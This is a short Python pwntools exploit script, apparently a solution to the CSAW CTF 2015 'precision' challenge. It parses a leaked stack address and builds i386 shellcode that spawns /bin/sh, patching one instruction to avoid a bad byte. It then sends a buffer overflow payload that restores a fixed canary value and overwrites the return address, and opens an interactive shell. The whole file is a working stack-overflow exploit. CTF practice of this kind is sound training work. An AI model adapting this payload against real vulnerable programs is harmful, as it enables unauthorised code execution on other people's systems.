#import pwntools and start the process
from pwn import *
target = process("./precision_a8f6f0590c177948fe06c76a1831e650")

#Take in the first line of input, and filter out the address and print it
bof = target.recvline().strip("\n")
print bof
bof = bof.replace("Buff: ", "")
bof = int(bof, 16)
print "The start of our input is: " + hex(bof)

#Write the shellcode from https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/solve.py
shellcode = asm(shellcraft.i386.pushstr('/bin///sh'))
shellcode += asm(shellcraft.i386.mov('ebx','esp'))
shellcode += asm(shellcraft.i386.mov('ecx',0))
#shellcode += asm(shellcraft.i386.push('0xb')) # Original, following instruction replace this command
shellcode += asm(shellcraft.i386.mov('eax',0x41)) # eax = 0x41
shellcode += '\x83\xe8\x36' # sub eax, 0x36 83 == sub, e8 == eax, 36 == number to subtract
shellcode += '\x99' # cdq
shellcode += '\xcd\x80' # int 0x8

#This isn't necissary, it just prints the length of the shellcode
print "The length of the shellcode is: " 
print len(shellcode)

#Assemble the payload
payload = shellcode + "0"*103 + "\xa5\x31\x5a\x47" + "\x55\x15\x50\x40" + "1"*12 + p32(bof)

#gdb.attach(target)

#Send the payload and drop to an interactive shell
target.sendline(payload) 
target.interactive()

 
